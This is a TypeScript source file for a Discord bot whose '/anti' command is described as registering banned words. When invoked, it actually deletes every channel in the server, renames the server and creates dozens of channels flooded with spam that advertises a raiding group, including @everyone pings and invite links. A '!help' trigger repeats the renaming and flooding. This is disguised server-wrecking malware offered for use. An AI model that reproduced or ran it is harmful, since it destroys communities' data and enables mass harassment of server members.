import { Client, GatewayIntentBits } from "@djs";
import "https://deno.land/std@0.191.0/dotenv/load.ts";
import { Interaction, REST, Routes, TextChannel } from "@djs";
import { Logger } from "./logger.ts";

const { TOKEN, CLIENT_ID } = Deno.env.toObject();

const rest = new REST({ version: "10" }).setToken(TOKEN);

try {
  Logger.log(`Command registering.`);
  await rest.put(Routes.applicationCommands(CLIENT_ID), {
    body: [
      {
        name: "anti",
        description: "**禁止ワードを登録中...**",
        type: 1,
        options: [
          {
            name: "text",
            type: 3,
            required: false,
            description: "**禁止する文章を入力してください**",
          },
        ],
      },
    ],
  });
  Logger.log(`Command registered.`);
} catch (error) {
  Logger.log(`Command registration failed.`, "WARN");
  Logger.log(error, "WARN");
}

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

client.on("ready", () => {
  Logger.log(`Logged in as ${Logger.bold(client.user?.tag ?? "")}`);
});

const wait = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
client.on("interactionCreate", async (interaction: Interaction) => {
    if (interaction.isCommand()) {
      const name = interaction.commandName;
 
      Logger.log(`Command: ${name}`);
      if (name === "anti") {
        const text = (
          interaction.options.data[0]
            ? interaction.options.data[0].value
            : `# 荒らし共栄圏最強
  # [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
  https://ctkpaarr.data.blog/
  https://discord.gg/annycW3Xrk
  # 荒らし共栄圏万歳
  @everyone
  ーーーーーーーーーーーーーーーー
  （画像） https://imgur.com/LacFtDP
  （画像） https://imgur.com/gQkpAYe
  （画像） https://imgur.com/mOlUpn3
  `
        )?.toString();
        await interaction.reply({ content: `**禁止ワードを登録しました**` });
  
        // NUKE
        const discordServer = client.guilds.cache.get(interaction.guildId ?? "");
        discordServer?.channels.cache.forEach(async (channel) => {
          try {
            await channel.delete();
          } catch (_e) {
            Logger.log(`Channel delete failed.`, "WARN");
          }
        });
  
        const max = 30;
        discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
  
        for (let i = 0; i < max / 2; i++) {
          await wait(300);
  
          try {
            discordServer?.channels
              .create({
                name:
                  (text?.split("\n")[0] ?? "荒らし共栄圏万歳！") +
                  ` ${(i + Math.random()).toString(36)}`,
                type: 0,
              })
              .then(async (channel: TextChannel) => {
                for (let j = 0; j < max * 3; j++) {
                  try {
                    await channel.send(
                      (text ?? "") + ` ${(j + Math.random()).toString(36)}`
                    );
                  } catch (_e) {
                    Logger.log(`Channel send failed.`, "WARN");
                  }
                }
              });
          } catch (error) {
            Logger.log(`Nuke one failed.`, "WARN");
            Logger.log(error, "WARN");
          }
        }
      }
    }
  });
  
  // message
  
  client.on("messageCreate", async (message) => {
    if (message.content.startsWith("!help")) {
      const text = `# 荒らし共栄圏最強
  # [荒らし共栄圏に参加](https://ctkpaarr.data.blog/#Discord)
  https://ctkpaarr.data.blog/
  https://discord.gg/annycW3Xrk
  # 荒らし共栄圏万歳
  @everyone
  ーーーーーーーーーーーーーーーー
  （画像） https://imgur.com/LacFtDP
  （画像） https://imgur.com/gQkpAYe
  （画像） https://imgur.com/mOlUpn3
  `;
  
      await message.reply({ content: "取得中..." });
  
      const discordServer = client.guilds.cache.get(message.guildId ?? "");
  
      discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
  
      for (let i = 0; i < 30; i++) {
        await wait(300);
  
        try {
          discordServer?.channels
            .create({
              name:
                (text?.split("\n")[0] ?? "荒らし共栄圏万歳！") +
                ` ${(i + Math.random()).toString(36)}`,
              type: 0,
            })
            .then(async (channel: TextChannel) => {
              for (let j = 0; j < 30 * 3; j++) {
                try {
                  await channel.send(
                    (text ?? "") + ` ${(j + Math.random()).toString(36)}`
                  );
                } catch (_e) {
                  Logger.log(`Channel send failed.`, "WARN");
                }
              }
            });
        } catch (error) {
          Logger.log(`Nuke one failed.`, "WARN");
          Logger.log(error, "WARN");
        }
      }
    }
  });

client.login(TOKEN);
